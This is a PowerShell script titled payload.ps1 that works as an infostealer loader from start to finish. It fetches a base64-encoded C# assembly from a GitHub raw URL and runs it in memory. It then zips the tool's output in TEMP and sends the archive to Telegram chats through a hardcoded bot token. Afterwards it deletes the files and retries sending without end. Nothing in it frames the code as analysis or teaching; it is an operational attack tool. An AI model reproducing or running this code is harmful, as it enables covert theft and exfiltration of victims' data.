# payload.ps1

# Step 1: Download base64-encoded C# EXE and load it in memory
$b64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clinetsfire/secure-downloads/main/secrets.txt')
$bytes = [System.Convert]::FromBase64String($b64)

# Step 2: Load and run the C# assembly in memory
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('all', '-o', "$env:TEMP\output")))

# Step 3: Wait for output folder and zip it
$outputDir = "$env:TEMP\output"
$zipPath = "$env:TEMP\output.zip"
$maxWait = 120  # 2 minutes max
$stableCount = 0
$prevSize = 0

for ($i = 0; $i -lt $maxWait -and $stableCount -lt 3; $i++) {
    if (Test-Path $outputDir) {
        Start-Sleep -Seconds 14
        $currentSize = (Get-ChildItem -Path $outputDir -Recurse | Measure-Object -Property Length -Sum).Sum
        
        if ($currentSize -ge 30720 -and $currentSize -eq $prevSize) {
            $stableCount++
        } else {
            $stableCount = 0
            $prevSize = $currentSize
        }
        
        if ($stableCount -ge 3) {
            Compress-Archive -Path "$outputDir\*" -DestinationPath $zipPath -Force
            break
        }
    } else {
        Start-Sleep -Seconds 14
    }
}

if (-not (Test-Path $zipPath)) { exit }

# Step 4: Send to Telegram
$botToken = "8221587974:AAFbQIx3rrcftHVxXL0fW71V0WnqL6ET6d0"
$chatId = "1798543672"
$theirChatId = "7986617900"

function Send-TelegramFile {
    param($Token, $ChatId, $FilePath)
    $uri = "https://api.telegram.org/bot$Token/sendDocument"
    $form = @{
        chat_id = $ChatId
        document = $null
    }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Form @{
            chat_id = $ChatId
            document = Get-Item -Path $FilePath
        } -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Try immediate send
if (Send-TelegramFile -Token $botToken -ChatId $theirChatId -FilePath $zipPath) {
    Send-TelegramFile -Token $botToken -ChatId $chatId -FilePath $zipPath
    Remove-Item -Path $zipPath -Force
    Remove-Item -Path $outputDir -Recurse -Force
    exit
}

# If no network, wait and retry every 30 seconds
while ($true) {
    Start-Sleep -Seconds 30
    if (Send-TelegramFile -Token $botToken -ChatId $theirChatId -FilePath $zipPath) {
        Send-TelegramFile -Token $botToken -ChatId $chatId -FilePath $zipPath
        Remove-Item -Path $zipPath -Force
        Remove-Item -Path $outputDir -Recurse -Force
        exit
    }
}